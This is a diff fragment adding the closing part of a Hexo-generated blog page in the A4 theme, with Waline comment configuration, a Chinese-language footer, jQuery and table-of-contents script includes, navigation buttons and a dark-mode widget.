+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
